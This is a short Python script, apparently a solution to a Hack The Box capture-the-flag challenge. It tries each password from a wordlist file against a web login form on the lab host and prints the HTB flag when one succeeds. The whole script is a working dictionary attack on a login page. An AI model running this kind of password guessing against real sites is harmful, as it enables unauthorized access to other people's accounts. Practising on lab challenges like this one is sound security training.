#!/usr/bin/env python3
import requests
import re

class colors:
	RED   = "\033[1;31m"  
	BLUE  = "\033[1;34m"
	CYAN  = "\033[1;36m"
	GREEN = "\033[0;32m"
	RESET = "\033[0;0m"
	BOLD    = "\033[;1m"
	REVERSE = "\033[;7m"

URL = 'http://docker.hackthebox.eu:32720/'
PASSWORD_DB = "pass2.txt"




s = requests.Session()
r = s.get(URL)

with open(PASSWORD_DB) as pass_db:
	count = 0
	for line in pass_db:
		pasw = line.split('\n')[0] 
		resp = {'password': pasw}
		req2 = s.post(URL, data=resp)
		print("Trying {} ... ".format(pasw) , end='')
		#print(re.search("Invalid password!", req2.text))
		if re.search("Invalid password!", req2.text):
			print(colors.RED + "Nope" + colors.RESET)
		else:
			print(colors.GREEN + "Yep!" + colors.RESET)
			flag = re.search("(HTB\{.*\})", req2.text).group(0)
			##print(req2.text)
			print("The flag is: " + flag)
			count = 1				
			break 
	if count == 0:
		print("No valid password found!")



